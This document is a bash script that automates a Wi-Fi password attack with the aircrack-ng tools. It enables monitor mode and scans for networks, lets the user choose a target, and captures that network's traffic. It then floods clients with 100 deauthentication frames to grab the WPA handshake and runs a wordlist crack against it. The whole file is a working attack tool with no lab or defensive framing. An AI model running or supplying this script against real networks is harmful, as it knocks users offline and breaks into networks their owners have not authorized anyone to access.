#!/bin/bash
clear
rm data*
rm dump*
rm objective.txt
rm target.txt
echo '+--------------------------------------------+'
echo '|                                            |'
echo '|                AIRCRACK-NG                 |'
echo '|                                            |'
echo '+--------------------------------------------+'
echo

wlan=$(ifconfig | grep wlan0 | awk '{print $1}')
wlan=${wlan%?}

echo 'Wlan founded ['$wlan']'

if [ "$wlan" = "wlan0mon" ]
then
	echo 'Wlan Monitor already on'
	echo
elif [[ "$wlan" = "wlan0" || "$wlan" = "" ]]
then
	echo 'Turn-on Wlan Monitor'
	echo
	airmon-ng check kill
	airmon-ng start wlan0
else
	echo 'Error Wlan not found'
fi

echo -e '+--------------------------------------------+\n'

gnome-terminal -- sh -c "airodump-ng -w data wlan0mon"
tsleep=2
progress=".........."
echo -ne 'Searching WI-FI   ['$progress']\r'
for i in {1..10}
do	
	progress=$(echo $progress | sed s/./#/$i)
	sleep $tsleep
	echo -ne 'Searching WI-FI   ['$progress']\r'
done
sleep 1
echo -ne '\n\n'

echo -e '+--------------------------------------------+\n'

echo -e 'WI-FI founded\n'
awk 'BEGIN {FS = ","} ; {print $14}' data-01.csv | sort | grep -v -e '^[[:space:]]*$' | sed 's/^ *//' | grep -v "ESSID" > target.txt
awk '{print NR, "|" $0}' target.txt
echo
read -p 'Choose your target: ' target
target=$(head -"$target" target.txt | tail -1)
grep "$target" data-01.csv > objective.txt

echo -e '\n+--------------------------------------------+\n'

bssid=$(awk 'BEGIN {FS = ","} ; {print $1}' objective.txt)
ch=$(awk 'BEGIN {FS = ","} ; {print $4}' objective.txt | sed 's/^ *//')
echo "airodump-ng --bssid $bssid -c $ch --write dump wlan0mon"
gnome-terminal -- sh -c "airodump-ng --bssid '$bssid' -c '$ch' --write dump wlan0mon"
tsleep=2
progress=".........."
echo -ne 'Dumping  ['$progress']\r'
for i in {1..10}
do	
	progress=$(echo $progress | sed s/./#/$i)
	sleep $tsleep
	echo -ne 'Dumping   ['$progress']\r'
done
sleep 1
echo -ne '\n\n'

echo -e '+--------------------------------------------+\n'

echo "aireplay-ng --deauth 100 -a $bssid wlan0mon"
gnome-terminal -- sh -c "aireplay-ng --deauth 100 -a '$bssid' wlan0mon"
tsleep=7
progress=".........."
echo -ne 'Sending   ['$progress']\r'
for i in {1..10}
do	
	progress=$(echo $progress | sed s/./#/$i)
	sleep $tsleep
	echo -ne 'Sending   ['$progress']\r'
done
sleep 1
echo -ne '\n\n'

echo -e '+--------------------------------------------+\n'

echo 'Aircrack-ng'
aircrack-ng dump-01.cap -w ./password.txt

echo -e '+--------------------------------------------+\n'

echo 'Turn-off Wlan Monitor'
airmon-ng stop wlan0mon

echo -e '+--------------------------------------------+\n'

echo 'Removing extra files'
rm data*
rm dump*
rm objective.txt
rm target.txt

echo -e '\n+--------------------------------------------+\n\n'
